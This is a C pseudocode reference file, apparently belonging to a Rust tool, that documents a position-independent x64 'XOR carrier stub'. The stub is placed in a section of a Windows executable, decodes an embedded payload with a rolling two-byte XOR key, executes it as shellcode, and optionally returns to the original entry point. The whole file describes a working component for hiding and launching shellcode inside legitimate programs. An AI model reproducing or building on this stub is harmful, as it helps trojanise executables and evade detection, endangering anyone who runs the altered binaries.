/*
 * xor_carrier.c — Reference C pseudocode for the XOR carrier stub
 *
 * NOT COMPILED. This file documents the logic matching the pre-assembled
 * x64 bytes in stubs.rs::XOR_STUB_CODE for auditability.
 *
 * Section data layout: [stub_code (77 bytes)] [xor_key (2 bytes)] [encoded_payload (N bytes)]
 *
 * The stub is position-independent (all addressing is RIP-relative).
 * RSP is aligned to 16 bytes before any CALL per Win64 ABI.
 */

#include <stdint.h>

// Placeholder — these are RIP-relative addresses in the actual stub
extern uint8_t* KEY_ADDR;       // → 2-byte XOR key (at stub_code + 77)
extern uint8_t* PAYLOAD_ADDR;   // → encoded payload (at stub_code + 79)
extern uint32_t PAYLOAD_LEN;    // patched at build time
extern void*    OEP_ADDR;       // patched: original entry point (RIP-relative)

void xor_carrier_stub(void) {
    // === RSP alignment (mandatory for Win64 ABI) ===
    // push rsi, rdi, rbx
    // and rsp, -16
    // sub rsp, 0x28  (shadow space)

    uint8_t key0 = KEY_ADDR[0];
    uint8_t key1 = KEY_ADDR[1];
    uint8_t* payload = PAYLOAD_ADDR;

    // === Decode: rolling 2-byte XOR ===
    for (uint32_t i = 0; i < PAYLOAD_LEN; i++) {
        if (i & 1) {
            payload[i] ^= key1;  // odd bytes use key[1]
        } else {
            payload[i] ^= key0;  // even bytes use key[0]
        }
    }

    // === Execute decoded shellcode ===
    ((void(*)(void))payload)();

    // === Optional: return to OEP ===
    // lea rax, [rip + OEP_DELTA]  ; computed at build time
    // jmp rax                      ; ASLR-safe (RIP-relative)

    // === Cleanup (if OEP return NOP'd) ===
    // add rsp, 0x28
    // pop rbx, rdi, rsi
    // ret
}
